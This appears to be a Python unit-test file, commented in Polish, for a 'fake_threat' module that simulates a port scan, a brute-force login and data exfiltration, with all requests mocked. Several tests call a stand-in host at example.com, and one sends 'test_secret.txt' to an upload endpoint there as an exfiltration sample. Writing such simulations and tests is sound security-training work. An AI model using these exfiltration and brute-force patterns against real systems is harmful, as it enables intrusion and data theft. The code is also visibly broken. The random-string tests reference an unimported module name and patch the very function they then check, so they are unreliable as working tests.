# tests/test_fake_attack.py
import unittest
from unittest.mock import patch, MagicMock
import requests
#Corrected absolute import:
from fake_threat import simulate_port_scan, simulate_brute_force_login, simulate_data_exfiltration, generate_random_string
import logging

# Wyłącz zbędne logi z biblioteki requests
logging.getLogger("requests").setLevel(logging.WARNING)
logging.getLogger("urllib3").setLevel(logging.WARNING)


class TestFakeThreat(unittest.TestCase):

    @patch('requests.get')
    def test_simulate_port_scan_open_port(self, mock_get):
        """Testuje symulację skanowania portu, gdy port jest otwarty."""
        mock_response = MagicMock()
        mock_response.status_code = 200  # Symuluj otwarty port
        mock_get.return_value = mock_response

        with self.assertLogs(level='WARNING') as cm:
            simulate_port_scan('127.0.0.1', 80, 80)
        self.assertIn("wydaje się być otwarty", cm.output[0])


    @patch('requests.get')
    def test_simulate_port_scan_closed_port(self, mock_get):
        """Testuje symulację skanowania, gdy port jest zamknięty."""
        mock_get.side_effect = requests.exceptions.RequestException("Connection refused")

        with self.assertLogs(level='DEBUG') as cm:
             simulate_port_scan('127.0.0.1', 80, 80)
        self.assertIn("prawdopodobnie zamknięty", cm.output[0])

    @patch('requests.post')
    def test_simulate_brute_force_login_success(self, mock_post):
        """Testuje symulację ataku brute-force z poprawnym hasłem."""

        # Symuluj odpowiedź serwera wskazującą na udane logowanie
        mock_response = MagicMock()
        mock_response.text = "Zalogowano pomyślnie" #DOPASUJ DO RZECZYWISTEGO KOMUNIKATU
        mock_post.return_value = mock_response

        # Użyj pliku z hasłami w trybie testowym (umieść go w katalogu testów!)
        with self.assertLogs(level='CRITICAL') as cm:
            simulate_brute_force_login('http://example.com/login', 'admin', ['password']) # TESTOWY PLIK
        self.assertIn("Udało się złamać hasło!", cm.output[0])


    @patch('requests.post')
    def test_simulate_brute_force_login_failure(self, mock_post):
        """Testuje symulację brute-force z błędnymi hasłami."""
        mock_response = MagicMock()
        mock_response.text = "Nieprawidłowe hasło" #DOPASUJ DO RZECZYWISTEGO KOMUNIKATU
        mock_post.return_value = mock_response

        with self.assertLogs(level='INFO') as cm:
            simulate_brute_force_login('http://example.com/login', 'admin', ['wrong'])
        self.assertTrue(any("Nieudana próba z hasłem" in log for log in cm.output))  # Sprawdź, czy są logi o nieudanych próbach
        self.assertTrue(any("Zakończono symulację ataku brute-force. Hasło nie zostało złamane." in log for log in cm.output)) # Sprawdz log o zakończeniu

    @patch('requests.post')
    def test_simulate_brute_force_login_file_not_found(self, mock_post):
       """Testuje przypadek, gdy pliku z hasłami nie znaleziono"""
       with self.assertLogs(level='ERROR') as cm:
           simulate_brute_force_login('http://example.com/login', 'admin', 'nonexistent_file.txt')
       self.assertIn("Nie znaleziono pliku z hasłami", cm.output[0])


    @patch('requests.post')
    def test_simulate_data_exfiltration_success(self, mock_post):
        """Test symulacji eksfiltracji danych - sukces."""
        mock_response = MagicMock()
        mock_response.status_code = 200
        mock_post.return_value = mock_response

        with self.assertLogs(level='CRITICAL') as cm:
            simulate_data_exfiltration('http://example.com/upload', 'test_secret.txt') #TESTOWY PLIK
        self.assertIn("Eksfiltracja pliku 'test_secret.txt' powiodła się!", cm.output[0])

    @patch('requests.post')
    def test_simulate_data_exfiltration_failure(self, mock_post):
        """Test symulacji eksfiltracji danych - porażka."""
        mock_response = MagicMock()
        mock_response.status_code = 400  # Błąd
        mock_post.return_value = mock_response

        with self.assertLogs(level='WARNING') as cm:
            simulate_data_exfiltration('http://example.com/upload', 'test_secret.txt')
        self.assertIn("Eksfiltracja pliku 'test_secret.txt' nie powiodła się", cm.output[0])


    @patch('requests.post')
    def test_simulate_data_exfiltration_file_not_found(self, mock_post):
        """Test eksfiltracji, gdy plik nie istnieje."""
        with self.assertLogs(level='ERROR') as cm:
            simulate_data_exfiltration('http://example.com/upload', 'nonexistent_file.txt')
        self.assertIn("Nie znaleziono pliku do eksfiltracji", cm.output[0])


    @patch('fake_threat.generate_random_string') # Patchujemy funkcję generującą losowe dane
    def test_generate_random_string(self, mock_gen_str):
        """Test generatora losowych ciągów"""
        mock_gen_str.return_value = "abcdefghij" # Ustawiamy zwracaną wartość
        result = fake_threat.generate_random_string()
        self.assertEqual(result, "abcdefghij")
        mock_gen_str.assert_called_once_with() # Sprawdzamy czy funkcja została wywołana

    @patch('fake_threat.generate_random_string')
    def test_generate_random_string_custom_length(self, mock_gen_str):
        """Test generatora z określoną długością."""
        mock_gen_str.return_value = "abc"
        result = fake_threat.generate_random_string(length=3)
        self.assertEqual(result, "abc")
        mock_gen_str.assert_called_once_with(length=3)


if __name__ == '__main__':
    unittest.main()